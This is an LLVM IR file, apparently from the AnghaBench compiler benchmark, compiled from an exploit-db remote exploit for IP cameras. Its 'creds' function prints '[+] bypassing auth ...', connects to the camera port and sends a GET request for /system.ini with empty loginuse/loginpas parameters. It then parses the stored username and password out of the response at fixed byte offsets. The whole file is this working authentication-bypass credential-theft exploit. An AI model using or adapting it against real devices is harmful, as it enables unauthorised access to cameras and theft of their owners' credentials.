; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/hardware/remote/extr_43142.c_creds.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/hardware/remote/extr_43142.c_creds.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, i32, i32 }
%struct.sockaddr = type { i32 }

@__const.creds.payload = private unnamed_addr constant [47 x i8] c"GET /system.ini?loginuse&loginpas HTTP/1.0\0D\0A\0D\0A\00", align 16
@.str = private unnamed_addr constant [24 x i8] c"[+] bypassing auth ... \00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [29 x i8] c"Error while creating socket\0A\00", align 1
@CAM_PORT = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [23 x i8] c"Error while inet_pton\0A\00", align 1
@.str.3 = private unnamed_addr constant [23 x i8] c"creds: connect failed\0A\00", align 1
@.str.4 = private unnamed_addr constant [20 x i8] c"creds: send failed\0A\00", align 1
@.str.5 = private unnamed_addr constant [3 x i8] c"%c\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i8* @creds(i8* %0, i32 %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca [8192 x i8], align 16
  %10 = alloca i8*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca [47 x i8], align 16
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  %17 = bitcast [8192 x i8]* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 16 %17, i8 0, i64 8192, i1 false)
  %18 = bitcast [47 x i8]* %12 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %18, i8* align 16 getelementptr inbounds ([47 x i8], [47 x i8]* @__const.creds.payload, i32 0, i32 0), i64 47, i1 false)
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %13, align 4
  store i32 0, i32* %14, align 4
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str, i64 0, i64 0))
  %20 = load i32, i32* @AF_INET, align 4
  %21 = load i32, i32* @SOCK_STREAM, align 4
  %22 = call i32 @socket(i32 %20, i32 %21, i32 0)
  store i32 %22, i32* %6, align 4
  %23 = icmp slt i32 %22, 0
  br i1 %23, label %24, label %26

24:                                               ; preds = %2
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.1, i64 0, i64 0))
  store i8* null, i8** %3, align 8
  br label %197

26:                                               ; preds = %2
  %27 = call i32 @memset(%struct.sockaddr_in* %8, i32 48, i32 12)
  %28 = load i32, i32* @AF_INET, align 4
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  store i32 %28, i32* %29, align 4
  %30 = load i32, i32* @CAM_PORT, align 4
  %31 = call i32 @htons(i32 %30)
  %32 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i32 %31, i32* %32, align 4
  %33 = load i32, i32* @AF_INET, align 4
  %34 = load i8*, i8** %4, align 8
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  %36 = call i64 @inet_pton(i32 %33, i8* %34, i32* %35)
  %37 = icmp sle i64 %36, 0
  br i1 %37, label %38, label %40

38:                                               ; preds = %26
  %39 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.2, i64 0, i64 0))
  store i8* null, i8** %3, align 8
  br label %197

40:                                               ; preds = %26
  %41 = load i32, i32* %6, align 4
  %42 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %43 = call i64 @connect(i32 %41, %struct.sockaddr* %42, i32 12)
  %44 = icmp slt i64 %43, 0
  br i1 %44, label %45, label %47

45:                                               ; preds = %40
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.3, i64 0, i64 0))
  store i8* null, i8** %3, align 8
  br label %197

47:                                               ; preds = %40
  %48 = load i32, i32* %6, align 4
  %49 = getelementptr inbounds [47 x i8], [47 x i8]* %12, i64 0, i64 0
  %50 = getelementptr inbounds [47 x i8], [47 x i8]* %12, i64 0, i64 0
  %51 = call i32 @strlen(i8* %50)
  %52 = call i64 @send(i32 %48, i8* %49, i32 %51, i32 0)
  %53 = icmp slt i64 %52, 0
  br i1 %53, label %54, label %56

54:                                               ; preds = %47
  %55 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.4, i64 0, i64 0))
  store i8* null, i8** %3, align 8
  br label %197

56:                                               ; preds = %47
  %57 = call i8* @malloc(i32 10240)
  store i8* %57, i8** %11, align 8
  %58 = icmp ne i8* %57, null
  br i1 %58, label %60, label %59

59:                                               ; preds = %56
  store i8* null, i8** %3, align 8
  br label %197

60:                                               ; preds = %56
  %61 = call i8* @calloc(i32 64, i32 1)
  store i8* %61, i8** %10, align 8
  %62 = icmp ne i8* %61, null
  br i1 %62, label %64, label %63

63:                                               ; preds = %60
  store i8* null, i8** %3, align 8
  br label %197

64:                                               ; preds = %60
  br label %65

65:                                               ; preds = %89, %64
  %66 = load i32, i32* %6, align 4
  %67 = getelementptr inbounds [8192 x i8], [8192 x i8]* %9, i64 0, i64 0
  %68 = call i32 @recv(i32 %66, i8* %67, i32 8192, i32 0)
  store i32 %68, i32* %7, align 4
  %69 = icmp sgt i32 %68, 0
  br i1 %69, label %70, label %90

70:                                               ; preds = %65
  %71 = load i32, i32* %7, align 4
  %72 = load i32, i32* %14, align 4
  %73 = add nsw i32 %72, %71
  store i32 %73, i32* %14, align 4
  %74 = load i32, i32* %14, align 4
  %75 = icmp slt i32 %74, 10240
  br i1 %75, label %76, label %84

76:                                               ; preds = %70
  %77 = load i8*, i8** %11, align 8
  %78 = load i32, i32* %13, align 4
  %79 = sext i32 %78 to i64
  %80 = getelementptr inbounds i8, i8* %77, i64 %79
  %81 = getelementptr inbounds [8192 x i8], [8192 x i8]* %9, i64 0, i64 0
  %82 = load i32, i32* %7, align 4
  %83 = call i32 @memcpy(i8* %80, i8* %81, i32 %82)
  br label %84

84:                                               ; preds = %76, %70
  %85 = load i32, i32* %7, align 4
  %86 = icmp sge i32 %85, 0
  br i1 %86, label %87, label %89

87:                                               ; preds = %84
  %88 = load i32, i32* %7, align 4
  store i32 %88, i32* %13, align 4
  br label %89

89:                                               ; preds = %87, %84
  br label %65

90:                                               ; preds = %65
  %91 = load i32, i32* %6, align 4
  %92 = call i32 @close(i32 %91)
  %93 = load i32, i32* %5, align 4
  %94 = icmp ne i32 %93, 0
  br i1 %94, label %95, label %118

95:                                               ; preds = %90
  store i32 0, i32* %15, align 4
  br label %96

96:                                               ; preds = %113, %95
  %97 = load i32, i32* %15, align 4
  %98 = load i32, i32* %14, align 4
  %99 = icmp ult i32 %97, %98
  br i1 %99, label %100, label %103

100:                                              ; preds = %96
  %101 = load i32, i32* %15, align 4
  %102 = icmp ult i32 %101, 10240
  br label %103

103:                                              ; preds = %100, %96
  %104 = phi i1 [ false, %96 ], [ %102, %100 ]
  br i1 %104, label %105, label %116

105:                                              ; preds = %103
  %106 = load i8*, i8** %11, align 8
  %107 = load i32, i32* %15, align 4
  %108 = zext i32 %107 to i64
  %109 = getelementptr inbounds i8, i8* %106, i64 %108
  %110 = load i8, i8* %109, align 1
  %111 = sext i8 %110 to i32
  %112 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i64 0, i64 0), i32 %111)
  br label %113

113:                                              ; preds = %105
  %114 = load i32, i32* %15, align 4
  %115 = add i32 %114, 1
  store i32 %115, i32* %15, align 4
  br label %96

116:                                              ; preds = %103
  %117 = call i32 @exit(i32 0) #4
  unreachable

118:                                              ; preds = %90
  store i32 50, i32* %16, align 4
  br label %119

119:                                              ; preds = %191, %118
  %120 = load i32, i32* %16, align 4
  %121 = icmp ult i32 %120, 10240
  br i1 %121, label %122, label %194

122:                                              ; preds = %119
  %123 = load i8*, i8** %11, align 8
  %124 = load i32, i32* %16, align 4
  %125 = sub i32 %124, 4
  %126 = zext i32 %125 to i64
  %127 = getelementptr inbounds i8, i8* %123, i64 %126
  %128 = load i8, i8* %127, align 1
  %129 = sext i8 %128 to i32
  %130 = icmp eq i32 %129, 10
  br i1 %130, label %131, label %190

131:                                              ; preds = %122
  %132 = load i8*, i8** %11, align 8
  %133 = load i32, i32* %16, align 4
  %134 = sub i32 %133, 3
  %135 = zext i32 %134 to i64
  %136 = getelementptr inbounds i8, i8* %132, i64 %135
  %137 = load i8, i8* %136, align 1
  %138 = sext i8 %137 to i32
  %139 = icmp eq i32 %138, 10
  br i1 %139, label %140, label %190

140:                                              ; preds = %131
  %141 = load i8*, i8** %11, align 8
  %142 = load i32, i32* %16, align 4
  %143 = sub i32 %142, 2
  %144 = zext i32 %143 to i64
  %145 = getelementptr inbounds i8, i8* %141, i64 %144
  %146 = load i8, i8* %145, align 1
  %147 = sext i8 %146 to i32
  %148 = icmp eq i32 %147, 10
  br i1 %148, label %149, label %190

149:                                              ; preds = %140
  %150 = load i8*, i8** %11, align 8
  %151 = load i32, i32* %16, align 4
  %152 = sub i32 %151, 1
  %153 = zext i32 %152 to i64
  %154 = getelementptr inbounds i8, i8* %150, i64 %153
  %155 = load i8, i8* %154, align 1
  %156 = sext i8 %155 to i32
  %157 = icmp eq i32 %156, 10
  br i1 %157, label %158, label %190

158:                                              ; preds = %149
  %159 = load i8*, i8** %11, align 8
  %160 = load i32, i32* %16, align 4
  %161 = zext i32 %160 to i64
  %162 = getelementptr inbounds i8, i8* %159, i64 %161
  %163 = load i8, i8* %162, align 1
  %164 = sext i8 %163 to i32
  %165 = icmp eq i32 %164, 1
  br i1 %165, label %166, label %190

166:                                              ; preds = %158
  %167 = load i32, i32* %16, align 4
  %168 = add i32 %167, 170
  %169 = icmp ult i32 %168, 10240
  br i1 %169, label %170, label %189

170:                                              ; preds = %166
  %171 = load i8*, i8** %10, align 8
  %172 = load i8*, i8** %11, align 8
  %173 = load i32, i32* %16, align 4
  %174 = add i32 %173, 138
  %175 = zext i32 %174 to i64
  %176 = getelementptr inbounds i8, i8* %172, i64 %175
  %177 = call i32 @strcat(i8* %171, i8* %176)
  %178 = load i8*, i8** %10, align 8
  %179 = getelementptr inbounds i8, i8* %178, i64 32
  %180 = load i8*, i8** %11, align 8
  %181 = load i32, i32* %16, align 4
  %182 = add i32 %181, 170
  %183 = zext i32 %182 to i64
  %184 = getelementptr inbounds i8, i8* %180, i64 %183
  %185 = call i32 @strcat(i8* %179, i8* %184)
  %186 = load i8*, i8** %11, align 8
  %187 = call i32 @free(i8* %186)
  %188 = load i8*, i8** %10, align 8
  store i8* %188, i8** %3, align 8
  br label %197

189:                                              ; preds = %166
  br label %190

190:                                              ; preds = %189, %158, %149, %140, %131, %122
  br label %191

191:                                              ; preds = %190
  %192 = load i32, i32* %16, align 4
  %193 = add i32 %192, 1
  store i32 %193, i32* %16, align 4
  br label %119

194:                                              ; preds = %119
  %195 = load i8*, i8** %11, align 8
  %196 = call i32 @free(i8* %195)
  store i8* null, i8** %3, align 8
  br label %197

197:                                              ; preds = %194, %170, %63, %59, %54, %45, %38, %24
  %198 = load i8*, i8** %3, align 8
  ret i8* %198
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @memset(%struct.sockaddr_in*, i32, i32) #2

declare dso_local i32 @htons(i32) #2

declare dso_local i64 @inet_pton(i32, i8*, i32*) #2

declare dso_local i64 @connect(i32, %struct.sockaddr*, i32) #2

declare dso_local i64 @send(i32, i8*, i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i8* @malloc(i32) #2

declare dso_local i8* @calloc(i32, i32) #2

declare dso_local i32 @recv(i32, i8*, i32, i32) #2

declare dso_local i32 @memcpy(i8*, i8*, i32) #2

declare dso_local i32 @close(i32) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @strcat(i8*, i8*) #2

declare dso_local i32 @free(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
